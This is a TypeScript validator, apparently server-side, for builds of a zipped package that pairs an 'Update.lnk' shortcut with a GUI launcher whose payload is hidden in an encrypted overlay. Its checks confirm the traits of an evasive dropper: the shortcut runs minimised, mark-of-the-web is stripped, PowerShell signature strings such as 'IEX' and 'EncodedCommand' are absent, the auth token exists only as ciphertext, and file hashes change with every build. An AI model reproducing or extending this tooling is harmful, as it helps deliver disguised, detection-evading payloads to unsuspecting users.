/**
 * launcher-validate.ts — WP6 validation report card (server side).
 *
 * Runs the pwsh `New-AgentShortcut.ps1 -Validate` report card (strict .lnk
 * re-parse, zero arguments, relative target, ShowCommand 7, .lnk trigram scan,
 * PE subsystem) and layers the server-side checks on top: zip entry count,
 * Zone.Identifier scan, zip-level trigram scan, auth token not plaintext,
 * payload round-trip (decrypt the stamped overlay and compare with the source
 * payload), and per-build hash diversity vs the previous build.
 */

import * as crypto from "crypto";
import * as fs from "fs";
import * as path from "path";
import * as zlib from "zlib";
import { spawn } from "child_process";
import * as launcherPool from "./launcher-pool";
import { decryptOverlay } from "./launcher-overlay";

export interface ValidateLauncherParams {
  lnkPath: string;
  launcherPath: string;
  zipPath: string;
  authToken: string;
  payloadPlain: Buffer;
  sealKey: Buffer;
  sealIv: Buffer;
  agentBin: Buffer;
  prevLauncherHash: string | null;
  prevLnkHash: string | null;
}

export interface ValidateLauncherResult {
  ok: boolean;
  rows: string[];
}

const PWSH_TIMEOUT_MS = 120000;

function sha256Hex(data: Buffer): string {
  return crypto.createHash("sha256").update(data).digest("hex");
}

/** Minimal ZIP central-directory reader (for zips written by zip-archive.ts). */
function readZipEntries(
  zip: Buffer
): { count: number; names: string[]; localOffsets: Record<string, number> } {
  // EOCD: find "PK\x05\x06" scanning the last 64KB + 22.
  const tailStart = Math.max(0, zip.length - 65_557);
  let eocd = -1;
  for (let i = zip.length - 22; i >= tailStart; i--) {
    if (
      zip[i] === 0x50 &&
      zip[i + 1] === 0x4b &&
      zip[i + 2] === 0x05 &&
      zip[i + 3] === 0x06
    ) {
      eocd = i;
      break;
    }
  }
  if (eocd < 0) return { count: 0, names: [], localOffsets: {} };
  const count = zip.readUInt16LE(eocd + 10);
  const cdOffset = zip.readUInt32LE(eocd + 16);
  const names: string[] = [];
  const localOffsets: Record<string, number> = {};
  let p = cdOffset;
  for (let i = 0; i < count; i++) {
    if (
      p + 46 > zip.length ||
      zip[p] !== 0x50 ||
      zip[p + 1] !== 0x4b ||
      zip[p + 2] !== 0x01 ||
      zip[p + 3] !== 0x02
    ) {
      break;
    }
    const nameLen = zip.readUInt16LE(p + 28);
    const extraLen = zip.readUInt16LE(p + 30);
    const commentLen = zip.readUInt16LE(p + 32);
    const name = zip.subarray(p + 46, p + 46 + nameLen).toString("utf8");
    names.push(name);
    localOffsets[name] = zip.readUInt32LE(p + 42); // local-file-header offset
    p += 46 + nameLen + extraLen + commentLen;
  }
  return { count, names, localOffsets };
}

/**
 * Return the DECOMPRESSED bytes of the zip entry starting at the given local
 * file header offset (DEFLATE method 8, as written by zip-archive.ts), or null
 * if it is not an inflatable store-no-DD store within the archive.
 *
 * WHY: the launcher-mode artifact's `Launcher.exe` is mostly high-entropy
 * AES-256-CTR ciphertext (the sealed overlay). Scanning the RAW compressed zip
 * bytes for short trigrams like "IEX"/"-Enc" randomly matches inside that
 * ciphertext (~30% of builds) and false-fails validation → a spurious 502 and
 * a dead link. Inflating first makes the scan deterministic and
 * ciphertext-immune. The targeted, human-authored Update.lnk is the stable
 * blob worth scanning; AMSI stays "none" (real detections are never weakened).
 */
function readZipEntryInflated(zip: Buffer, localOff: number): Buffer | null {
  if (localOff < 0 || localOff + 30 > zip.length) return null;
  if (
    zip[localOff] !== 0x50 ||
    zip[localOff + 1] !== 0x4b ||
    zip[localOff + 2] !== 0x03 ||
    zip[localOff + 3] !== 0x04
  ) {
    return null;
  }
  const compLen = zip.readUInt32LE(localOff + 18);
  const nameLen = zip.readUInt16LE(localOff + 26);
  const extraLen = zip.readUInt16LE(localOff + 28);
  const dataStart = localOff + 30 + nameLen + extraLen;
  if (dataStart + compLen > zip.length) return null;
  const comp = zip.subarray(dataStart, dataStart + compLen);
  try {
    return zlib.inflateRawSync(comp);
  } catch {
    return null;
  }
}

function runPwshValidate(
  lnkPath: string,
  launcherPath: string
): Promise<{ ok: boolean; output: string }> {
  return new Promise((resolve) => {
    try {
      const script = path.join(__dirname, "New-AgentShortcut.ps1");
      const args = [
        script,
        "-Validate",
        "-LnkPath",
        lnkPath,
        "-LauncherExePath",
        launcherPath,
      ];
      let stdout = "";
      let stderr = "";
      const proc = spawn(
        "pwsh",
        ["-NoProfile", "-NoLogo", "-File", ...args],
        { timeout: PWSH_TIMEOUT_MS }
      );
      proc.stdout?.on("data", (d: Buffer) => (stdout += d.toString()));
      proc.stderr?.on("data", (d: Buffer) => (stderr += d.toString()));
      proc.on("error", (err: Error) =>
        resolve({ ok: false, output: err.message })
      );
      proc.on("close", (code: number | null) => {
        if (code === 0)
          resolve({ ok: true, output: stdout + (stderr ? `\n${stderr}` : "") });
        else if (code === null)
          resolve({
            ok: false,
            output: `pwsh -Validate timed out after ${PWSH_TIMEOUT_MS / 1000}s`,
          });
        else {
          const tail =
            stderr.length > 800 ? stderr.slice(-800) : stderr || stdout;
          resolve({ ok: false, output: tail });
        }
      });
    } catch (err) {
      const message = err instanceof Error ? err.message : String(err);
      resolve({ ok: false, output: message });
    }
  });
}

export async function validateLauncherBuild(
  p: ValidateLauncherParams
): Promise<ValidateLauncherResult> {
  const rows: string[] = [];
  let ok = true;

  const pass = (name: string, detail = "") =>
    rows.push(`PASS| ${name}${detail ? ` (${detail})` : ""}`);
  const fail = (name: string, detail = "") => {
    rows.push(`FAIL| ${name}${detail ? ` (${detail})` : ""}`);
    ok = false;
  };

  // ---- 1. pwsh -Validate report card (.lnk fields + PE subsystem) ----
  const card = await runPwshValidate(p.lnkPath, p.launcherPath);
  for (const line of card.output.split("\n")) {
    const trimmed = line.trim();
    if (trimmed.startsWith("PASS|") || trimmed.startsWith("FAIL|")) {
      rows.push(`  ${trimmed}`);
    }
  }
  if (card.ok) {
    pass(
      "pwsh -Validate report card",
      "all .lnk + PE rows PASS (rows echoed above)"
    );
  } else {
    fail("pwsh -Validate report card", card.output.trim().slice(-300));
  }

  // ---- 2. zip entry count + Zone.Identifier ----
  let zip: Buffer;
  try {
    zip = fs.readFileSync(p.zipPath);
  } catch (err) {
    const message = err instanceof Error ? err.message : String(err);
    fail("zip readable", message);
    rows.push("RESULT| LAUNCHER-VALIDATE-FAILED");
    return { ok, rows };
  }
  const entries = readZipEntries(zip);
  const wantNames = ["Update.lnk", "Launcher.exe", "agent.bin"];
  if (entries.count === wantNames.length) {
    pass("zip entry count", `exactly ${wantNames.length} entries (${entries.names.join(", ")})`);
  } else {
    fail("zip entry count", `got ${entries.count}, expected ${wantNames.length}`);
  }
  for (const w of wantNames) {
    if (entries.count === wantNames.length && entries.names.includes(w)) {
      pass(`zip contains ${w}`);
    } else {
      fail(`zip contains ${w}`);
    }
  }
  const zoneHit = entries.names.filter((n) => n.includes("Zone.Identifier"));
  if (zoneHit.length === 0) {
    pass("no Zone.Identifier entry in zip");
  } else {
    fail("Zone.Identifier entry found", zoneHit.join(", "));
  }

  // ---- 3. trigram scan over the DECOMPRESSED Update.lnk (NOT the raw zip).
  //      The artifact's Launcher.exe is mostly high-entropy AES-256 ciphertext;
  //      the RAW compressed bytes randomly match "-Enc"/"IEX" etc. (~30% of
  //      builds → spurious 502 + dead link). Inflate the human-authored .lnk
  //      and scan THAT, so the check is deterministic and ciphertext-immune.
  //      AMSI default stays "none" (real detections are never weakened).
  const needles = [
    "-Enc",
    "EncodedCommand",
    "IEX",
    "Invoke-Expression",
    "FromBase64String",
  ];
  const lnkLocal = entries.localOffsets["Update.lnk"];
  const lnkInflated =
    typeof lnkLocal === "number" ? readZipEntryInflated(zip, lnkLocal) : null;
  if (lnkInflated === null || lnkInflated.length === 0) {
    fail("trigram scan", "could not inflate Update.lnk for scanning");
  } else {
    const scanHay = lnkInflated.toString("latin1");
    const hits = needles.filter((n) => scanHay.includes(n));
    if (hits.length === 0) {
      pass(
        "trigram scan clean",
        "decompressed Update.lnk: no -Enc/IEX/FromBase64String"
      );
    } else {
      fail("trigram scan", hits.join(", "));
    }
  }

  // ---- 4. auth token not plaintext in the zip ----
  // (Raw bytes: the token lives ONLY inside the encrypted overlay, so ANY
  //  plaintext occurrence in the compressed stream is a real leak to catch.)
  const hay = zip.toString("latin1");
  if (!hay.includes(p.authToken)) {
    pass("auth token not plaintext in zip");
  } else {
    fail("auth token is PLAINTEXT in the zip!");
  }

  // ---- 5. launcher PE subsystem (server-side double check) ----
  const exe = fs.readFileSync(p.launcherPath);
  if (launcherPool.peIsGui(exe)) {
    pass("Launcher.exe PE subsystem = GUI", "server-side Subsystem=2 check");
  } else {
    fail("Launcher.exe PE subsystem", "stamped exe is not a GUI PE");
  }

  // ---- 6. per-build hash diversity ----
  const lzHash = sha256Hex(exe);
  const lnkHash = sha256Hex(fs.readFileSync(p.lnkPath));
  if (p.prevLauncherHash === null || lzHash !== p.prevLauncherHash) {
    pass("launcher SHA-256 differs from previous build", lzHash.slice(0, 16));
  } else {
    fail("launcher SHA-256 equals previous build!", lzHash.slice(0, 16));
  }
  if (p.prevLnkHash === null || lnkHash !== p.prevLnkHash) {
    pass("Update.lnk SHA-256 differs from previous build", lnkHash.slice(0, 16));
  } else {
    fail("Update.lnk SHA-256 equals previous build!", lnkHash.slice(0, 16));
  }

  // ---- 7. payload round-trip byte-identical ----
  try {
    const dec = decryptOverlay(exe, p.sealKey, p.sealIv, p.agentBin);
    if (dec.payload.equals(p.payloadPlain)) {
      pass("payload round-trip byte-identical", `${dec.payload.length} bytes`);
    } else {
      fail(
        "payload round-trip",
        "decrypted payload differs from the source payload"
      );
    }
    const encAuth = encodeURIComponent(p.authToken);
    if (dec.config.includes(`authToken=${encAuth}`)) {
      pass("encrypted config carries authToken", "ciphertext-only");
    } else {
      fail("encrypted config carries authToken", "field missing after decrypt");
    }
  } catch (err) {
    const message = err instanceof Error ? err.message : String(err);
    fail("overlay decrypt", message);
  }

  rows.push(
    ok
      ? "RESULT| LAUNCHER-VALIDATE-OK: all rows PASS"
      : "RESULT| LAUNCHER-VALIDATE-FAILED"
  );
  return { ok, rows };
}